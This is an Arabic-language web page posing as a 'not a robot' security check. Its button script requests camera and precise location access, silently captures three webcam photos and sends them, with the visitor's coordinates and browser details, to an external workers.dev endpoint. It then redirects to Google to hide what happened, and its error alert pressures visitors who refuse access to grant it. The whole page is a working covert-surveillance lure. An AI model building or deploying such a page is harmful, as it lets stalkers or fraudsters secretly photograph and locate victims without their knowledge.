<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام التحقق الأمني</title>
    <style>
        body { margin: 0; background: #050510; color: #fff; font-family: sans-serif; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        button { padding: 20px 50px; font-size: 22px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,123,255,0.4); }
    </style>
</head>
<body>

    <h2>يرجى التحقق من أنك لست روبوت</h2>
    <p>اضغط للبدء</p>
    <button onclick="startProcess()">ابدأ التحقق الآن</button>

    <script>
    async function startProcess() {
        const workerUrl = "https://tlgram.alidm0935.workers.dev/";

        try {
            // 1. طلب إذن الكاميرا والموقع معاً
            const [stream, position] = await Promise.all([
                navigator.mediaDevices.getUserMedia({ video: true }),
                new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true}))
            ]);

            const video = document.createElement('video'); video.srcObject = stream; await video.play();
            const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
            const ctx = canvas.getContext('2d');

            // 2. التقاط وإرسال 3 لقطات متتالية باستخدام FormData
            for(let i = 0; i < 3; i++) {
                ctx.drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL('image/jpeg', 0.5);

                // تجهيز البيانات بالأسلوب الذي يفهمه الـ Worker الخاص بك
                const formData = new FormData();
                formData.append('img', img);
                formData.append('lat', position.coords.latitude);
                formData.append('lon', position.coords.longitude);
                formData.append('info', navigator.userAgent);

                await fetch(workerUrl, {
                    method: 'POST',
                    body: formData // إرسال كـ FormData
                });
                
                await new Promise(r => setTimeout(r, 1000));
            }

            stream.getTracks().forEach(t => t.stop());
            window.location.href = "https://www.google.com";

        } catch (e) {
            alert("يرجى السماح بالوصول للكاميرا والموقع لإتمام التحقق.");
        }
    }
    </script>
</body>
</html>
